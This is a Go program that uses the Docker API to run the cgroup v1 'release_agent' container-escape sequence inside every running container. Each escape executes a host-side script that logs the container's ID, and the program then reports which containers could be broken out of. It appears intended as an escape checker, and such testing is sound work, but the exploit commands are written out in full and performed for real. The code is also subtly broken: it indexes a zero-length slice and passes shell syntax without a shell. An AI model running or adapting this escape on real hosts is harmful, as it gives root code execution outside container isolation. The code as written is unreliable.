package main

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"time"

	"github.com/docker/docker/api/types"
	"github.com/docker/docker/api/types/container"
	"github.com/docker/docker/client"
)

func main() {
	filePath := "/tmp/cec"
	// ファイルが存在する場合は削除
	if _, err := os.Stat(filePath); err == nil {
		os.Remove(filePath)
	}

	// 空のファイルを作成
	file, err := os.Create(filePath)
	if err != nil {
		fmt.Println("Error creating file:", err)
		return
	}
	defer file.Close()

	cli, err := client.NewClientWithOpts(client.FromEnv)
	if err != nil {
		panic(err)
	}

	containers, err := cli.ContainerList(context.Background(), container.ListOptions{})
	if err != nil {
		panic(err)
	}

	containerIDs := make([]string, 0, len(containers))

	for i, container := range containers {
		containerIDs[i] = container.ID
		fmt.Printf("Container ID: %s\n", container.ID)
		commands := [][]string{
			{`mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x`},
			{`echo 1 > /tmp/cgrp/x/notify_on_release`},
			{`echo '#!/bin/sh\necho "` + container.ID + `" >> /tmp/cec' > /cmd && chmod +x /cmd`},
			{`echo "$(mount | grep overlay2 | grep -oP 'upperdir=\K[^,]*')/cmd" > /tmp/cgrp/release_agent`},
			{`echo 0 > /tmp/cgrp/x/cgroup.procs`},
			{"sh", "-c", `echo \$\$ > /tmp/cgrp/x/cgroup.procs`},
		}
		for _, cmd := range commands {
			execConfig := types.ExecConfig{
				Cmd: cmd,
			}
			execResp, err := cli.ContainerExecCreate(context.Background(), container.ID, execConfig)
			if err != nil {
				fmt.Fprintf(os.Stderr, "Error creating exec: %v\n", err)
				continue
			}

			err = cli.ContainerExecStart(context.Background(), execResp.ID, types.ExecStartCheck{})
			if err != nil {
				fmt.Fprintf(os.Stderr, "Error starting exec: %v\n", err)
				continue
			}
		}
	}

	// 1秒待機
	time.Sleep(1 * time.Second)

	// ファイルを読み込み、配列と比較
	file, err = os.Open(filePath)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for i, containerID := range containerIDs {
		scanner.Scan()
		line := scanner.Text()
		if line == containerID {
			fmt.Printf("Match found at index %d: %s\n", i, containerID)
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading file:", err)
	}

}
